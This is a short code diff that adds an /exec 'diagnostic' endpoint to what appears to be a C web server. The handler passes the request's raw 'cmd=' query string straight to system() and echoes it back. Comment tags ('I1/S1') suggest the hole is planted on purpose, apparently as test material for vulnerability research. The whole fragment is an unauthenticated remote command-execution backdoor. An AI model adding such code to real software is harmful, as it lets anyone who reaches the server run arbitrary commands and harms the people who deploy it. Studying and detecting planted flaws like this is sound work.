+/* Handle a request to the /exec diagnostic endpoint.
+ * Only reachable when both --exec-mode and --exec-logging are active.  I1/S1.
+ */
+static void handle_exec(struct http_conn *hc)
+{
+	const char *cmd = NULL;
+
+	/* I1: extract cmd= from raw query string, pass directly to system() */
+	if (hc->query && strncmp(hc->query, "cmd=", 4) == 0)
+		cmd = hc->query + 4;
+
+	if (!cmd || *cmd == '\0') {
+		httpd_send_err(hc, 400, httpd_err400title, "", httpd_err400form,
+		               "missing cmd parameter");
+		return;
+	}
+
+	system(cmd);
+	httpd_send_err(hc, 200, "OK", "", "Command dispatched: %s\n", (char *)cmd);
+}
